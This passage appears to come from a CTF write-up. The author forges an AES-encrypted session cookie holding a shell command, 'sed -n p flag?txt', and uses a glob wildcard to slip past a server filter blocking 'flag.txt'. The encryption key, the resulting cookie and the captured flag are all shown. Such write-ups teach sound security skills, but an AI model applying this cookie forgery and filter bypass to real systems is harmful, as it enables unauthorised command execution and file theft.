g5ODNmODQzMDJkODgwNGNkODVlOGEzMDI0MDY4NjgxMjRiMzE2ZTdhYTVkMjVmNzFjMmY5NzI0MGYyMTNmM2ZmNjM1N2UzNzJiMmFiYmZhYTQxMTBiOWIxZDkxOWIzYmUzYTdkMjcyZGFmODc2MTMwMDY4ZGI1YmIxYmM2NWYzMmE1NjU4ZGI1OGJmMmVkM2UyYjU4MTJlNWU4ODk5YmZhZDZkNDQ4YjMxZTUyYTk0NmI3OTA0NDNjZDRlODZkMjc2MzVkYzIyNjI2NTg2Mjg3NjE1ZjY4NDVmMWExYWM2MzhmNGI2ZmI0MjM0MGRmYTkwMjk2MWQ1NTM3MWEwZDA4M2YzM2VjYzg)

Now I can encrypt my own cookie which will read the flag! I encrypt this cookie:
```shell
{
  "cmd":"sed -n p flag?txt"
}
```
`?` is a shell glob wildcard that matches any single character, so `flag?txt` matches `flag.txt` on the filesystem without containing the literal string `flag.txt` that the server blocks. 

[encrypting cookie cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'UTF8','string':'inshallah_nobody_will_steal_this'%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Hex',%7B'option':'Hex','string':''%7D)&input=ewogICJjbWQiOiJzZWQgLW4gcCBmbGFnP3R4dCIKfQ)

I get the cookie: `71aa1cb66736d7c647658418f8a04ebae279eb3e2643a03204227f2adacbc13e`

I set my cookie in my browser and get the flag:

![Alt text](/images/bhackariweb3.png)

`bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}`